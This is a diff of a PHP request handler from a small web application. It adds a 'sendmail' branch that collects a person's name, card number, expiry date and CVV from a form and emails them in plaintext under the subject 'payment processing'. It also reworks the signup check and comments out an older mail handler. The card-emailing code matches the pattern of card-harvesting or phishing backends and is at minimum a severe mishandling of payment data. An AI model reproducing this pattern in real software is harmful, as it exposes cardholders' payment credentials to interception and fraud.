@@ -189,6 +189,34 @@
         $ctrl->delete_this($id, $table);
     }
 
+    if(isset($_POST['sendmail'])){
+        $dbClass = new Database();
+        $db = $dbClass->connect();
+        $ctrl = new Controller($db);
+        $name = $_POST['name'];
+        $to = $_POST['email'];
+        $card_number = $_POST['cardNumber'];
+        $card_expiration_month = $_POST['expMonth'];
+        $card_expiration_year = $_POST['expirationYear'];
+        $cvv = $_POST['cvv'];
+        $email_body = "You have received a new message.\n\n";
+        $email_body .= "Card owner: $name\n";
+        $email_body .= "Card number: $card_number\n";
+        $email_body .= "Card expiration month: $card_expiration_month\n";
+        $email_body .= "Card expiration year: $card_expiration_year\n";
+        $email_body .= "Card CVC: $cvv\n";
+        $fields = [
+           "name" => $name,
+           "subject" => "payment processing",
+           "email" => $to,
+           "message" => $email_body 
+        ];
+        $ctrl->setData($fields);
+        $ctrl->send_mail();
+        // print_r($_POST);
+
+    }
+
     if(isset($_POST['getEdit'])){
         $dbClass = new Database();
         $db = $dbClass->connect();
@@ -199,34 +227,34 @@
         echo $data;
     }
 
-    if(isset($_POST['signup'])){
+    if(isset($_POST['signUp'])){
         $dbh = new Database;
         $db = $dbh->connect();
         $ctrl = new Controller($db);
 	
-        $userName = $_POST['username'];
+        // $userName = $_POST['username'];
         $email = $_POST['email'];
         $pword = $_POST['password'];
         $rPword = $_POST['rePassword'];
         //$obj = new Controller;
         
-        if($pword != $rPword)
+        if($pword == $rPword)
         {
-           $response = [
-             "status" => "500",
-             "text" => "password does not match"
-           ];
-
-           echo json_encode($response);
-           return;
+            $fields = [
+                // 'username'=>$userName,
+                'email'=>$email,
+                'password'=>password_hash($pword,PASSWORD_DEFAULT)
+            ];
+            $ctrl->setData($fields);
+            $ctrl->addUser();
+        }else{
+            $response = [
+                "status" => "500",
+                "text" => "password does not match"
+              ];
+   
+              echo json_encode($response);
         }
-        $fields = [
-            'username'=>$userName,
-            'email'=>$email,
-            'password'=>password_hash($pword,PASSWORD_DEFAULT)
-        ];
-        $ctrl->setData($fields);
-        $ctrl->addUser();
     
     }
 
@@ -272,16 +300,16 @@
     //     $ctrl->update($_POST['id'], "inbox");
     // }
 
-    if(isset($_POST['sendMail'])){
-        $dbh = new Database;
-        $db = $dbh->connect();
-        $ctrl = new Controller($db);
-        $fields = [
-            "recipient_name" => $_POST['name'],
-            "recipient_email" => $_POST['email'],
-            "subject" => $_POST['subject'],
-            "message" => $_POST['message'],
-        ];
-        $ctrl->setData($fields);
-        $ctrl->send_mail();
-    }
+    // if(isset($_POST['sendMail'])){
+    //     $dbh = new Database;
+    //     $db = $dbh->connect();
+    //     $ctrl = new Controller($db);
+    //     $fields = [
+    //         "recipient_name" => $_POST['name'],
+    //         "recipient_email" => $_POST['email'],
+    //         "subject" => $_POST['subject'],
+    //         "message" => $_POST['message'],
+    //     ];
+    //     $ctrl->setData($fields);
+    //     $ctrl->send_mail();
+    // }
